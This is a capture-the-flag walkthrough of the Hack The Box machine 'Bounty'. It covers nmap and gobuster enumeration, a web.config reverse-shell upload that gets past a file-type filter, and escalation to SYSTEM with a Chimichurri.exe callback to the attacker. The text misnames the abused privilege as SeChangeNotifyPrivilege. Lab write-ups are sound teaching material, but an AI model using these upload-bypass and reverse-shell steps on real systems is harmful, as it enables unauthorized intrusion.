![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/864ae837-1aaa-4b5c-86d7-ee9486da8898)

first enumeration with nmap 

```
# Nmap 7.93 scan initiated Fri Jun  2 10:03:16 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 80 -Pn 10.10.10.93
Nmap scan report for bounty.htb (10.10.10.93)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  2 10:03:30 2023 -- 1 IP address (1 host up) scanned in 14.22 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/94a5cd95-4184-4ec0-bc36-1074311df162)

opening the ip on a browser, got redirected to a page with a merlin picture. let's fuzz for directories 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Bounty]
└─$ gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirb/common.txt -x aspx                
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.93/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              aspx
[+] Timeout:                 10s
===============================================================
2023/06/03 01:14:29 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 156] [--> http://10.10.10.93/aspnet_client/]
/transfer.aspx        (Status: 200) [Size: 941]
/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
Progress: 9219 / 9230 (99.88%)
===============================================================
2023/06/03 01:17:01 Finished
===============================================================
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/10e130bc-88dd-4632-ad01-19a39ae5cd86)

navigate to `transfer.aspx`, there is a file upload func there. tried to upload an aspx reverse shell file, got `Invalid File. Please try again` let's fuzz for the type of extention that is allowed.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5a57146f-9732-4455-a269-98476212e59f)

cool we can see the allowed extensions. `.config,.doc...` let's look for a `.config` revshell payload we can create 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7ea2f031-01d1-47a9-9867-93ede665367d)

cool we found one on github [web.config](https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/web.config), let's download the file. also we need an `Invoke-PowerShellTcp.ps1` file. fire up python http server along with ncat listener.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c06b77fe-53c3-4377-aa07-333c7a590ef8)

upload the `web.config` file. let's locate this file.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f612589f-fe1b-414e-a7c9-af2b23585144)

find the file and check back ncat listener.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7b35e01a-04af-4301-85bd-6d7c959f3999)

Bull's eye we got a reverse shell.


## Privilege Escalation

```
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 
```
checking privs, we can see we have `SeChangeNotifyPrivilege` enabled. let's abuse this. let's run `Chimichurri.exe`

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/96b7e3ec-b575-4f53-8e7b-19ffa02bec39)

running `chimichurri.exe IP PORT` got a reverse shell as `nt authority\system`.




